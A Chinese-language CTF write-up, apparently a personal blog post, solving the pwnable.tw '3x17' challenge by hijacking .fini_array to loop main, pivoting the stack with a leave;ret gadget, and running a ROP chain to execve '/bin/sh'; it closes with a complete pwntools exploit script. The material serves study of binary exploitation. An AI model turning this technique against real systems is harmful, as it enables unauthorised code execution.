---

title: pwnable.tw WriteUp - 3x17
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

[ 3x17 题目链接](https://pwnable.tw/challenge/#32)

```bash
z1933@1933:~/workplace/vbshare/ctf 
$ file 3x17 
3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
z1933@1933:~/workplace/vbshare/ctf 
$ checksec 3x17
[*] '/home/z1933/workplace/vbshare/ctf/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
z1933@1933:~/workplace/vbshare/ctf 
```

静态链接 + 去符号。在入口点找到 main 函数。


根据 [Linux Standard Base Specification 3.1__libc_start_main](https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html) 。__libc_start_main 传入的第一个参数就是 main 函数的地址。

找到了 main 之后，反编译如下：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write(1u, "addr:", 5uLL);
    read(0, buf, 24uLL);
    v4 = (char *)sub_40EE70(buf);
    write(1u, "data:", 5uLL);
    read(0, v4, 0x18uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    cannaryfail();
  return result;
}
```

`sub_40EE70` 函数大概就是检查输入是不是一个数字,然后把字符转成数字返回。我分析时发现，里面有很多冗余(比如有的条件跳转实际上是一定会跳转或者不跳转的)，反编译结果不准确，只能对着汇编逆向分析。

对程序调试分析会发现 main 使得我们可以在可写的位置任意写 24 字节,然后程序退出。

好叭，到这里我就卡住了。参考了一下别人的题解: [pwnable.tw 3x17](https://www.cnblogs.com/Rookle/p/12884559.html) 才发现原来 main 函数在结束后还会执行 [__libc_start_main 参数列表](https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html) 中的  `void (*fini) (void)` 函数,也就是倒数第三个函数即 `0x402960` 处的函数,在 IDA 中我把它命名为 `_libc_fini` 函数。

`_libc_fini` 函数会倒序执行 `.fini_array` 节中的表所存的函数。

`_libc_fini` 函数的反编译:

```cpp
__int64 libc_fini()
{
  signed __int64 v0; // rbx

  if ( (&finiend - (_UNKNOWN *)fini0) >> 3 )
  {
    v0 = ((&finiend - (_UNKNOWN *)fini0) >> 3) - 1;
    do
      fini0[v0--]();
    while ( v0 != -1 );
  }
  return term_proc();
}
```

`finiend` 是 `.fini_array` 节的开始位置， `finiend` 是 `.fini_array` 节的结束位置。从反编译可以看出是倒序调用的。 `.fini_array` 节权限是可写的。

如果我们把 fini[1] 写入 main 函数的地址, fini[0] 写入 `_libc_fini` 函数,那么我们就可以循环调用 main 函数。就有很多次写的机会了。

**调用链:**

```
                                                                                                                              
+--------------------+                     +-----------------------------+                                                    
|                    |                     |                             |                     +-----------------------------+
|                    |                     |          fini[1] 调用       |                     |                             |
|          main     ------------------------>                          ------------------------->        fini[0] 调用        |
|                    |                     |           main              |                     |                             |
|                    |                     |                             |                     |        libc_fini            |
+--------------------+                     +--------------^--------------+                     +--|--------------------------+
                                                          |                                       |                           
                                                          |                                       |                           
                                                          |                                       |                           
                                                          |                                       |                           
                                                          |                                       |                           
                                                          |---------------------------------------+                           
                                                                                                                              
                                                                                                                              
                     
```

现在我们可以在可写地址，写任意值。想到用 ROP 来 getshell 。因为不知道栈地址，不能往栈上写。但我们可以控制 `fini[1], fini[0]` 两处的gadget 。我们知道 `leave` 指令等价于:

```
mov rsp,rbp
pop rbp
```

要是能用 leave 指令把栈指针 rsp 移到一个我们写 gadget 的地方就好了。所以我们需要观察 rbp ,让 rbp 指向一个我们写 gadget 的位置,再用 leave 指令，就转移了栈指针。 在看 `_libc_fini` 函数的反汇编时会发现 rbp 会被初始化为  `.fini_array` 表的起始地址, 然后调用 fini[1]，  fini[0]。 如果我们把 `fini[0]` 写入 `leave;ret` gadget , `fini[1]` 写 `ret` gadget , 这样在最后就可以把栈转移到  `.fini_array` 节中了,还可以退出 main 的循环。


## exp:

```python
#!/usr/bin/env python3
from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10105
PROC="./3x17"

io=None

if len(sys.argv) == 1 : 
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

def write(addr,payload):
    io.sendafter('addr:',str(addr))
    io.sendafter('data:',payload)

fini_arry=0x4B40F0
main=0x0401B6D
libc_fini=0x402960

leave_ret=0x0000000000401c4b # leave ; ret
ret=0x0000000000401C4C

binsh="/bin/sh\x00"

rsp=0x4B4100

pop_rax_ret=0x000000000041e4af # pop rax ; ret
pop_rdx_rsi_ret=0x000000000044a309 # pop rdx ; pop rsi ; ret
pop_rdi_ret=0x0000000000401696 # pop rdi ; ret
syscall=0x00000000004022b4 # syscall

# 构造循环
write(fini_arry,p64(libc_fini)+p64(main))

# 写入gadget
write(rsp,p64(pop_rax_ret))
write(rsp+1*8,p64(0x3b))
write(rsp+2*8,p64(pop_rdx_rsi_ret))
write(rsp+3*8,p64(0))
write(rsp+4*8,p64(0))
write(rsp+5*8,p64(pop_rdi_ret))
write(rsp+6*8,p64(rsp+10*8))
write(rsp+7*8,p64(syscall))

# 找个可写的位置写binsh
write(rsp+10*8,binsh)

# 栈转移
write(fini_arry,p64(leave_ret)+p64(ret))

io.interactive()

```

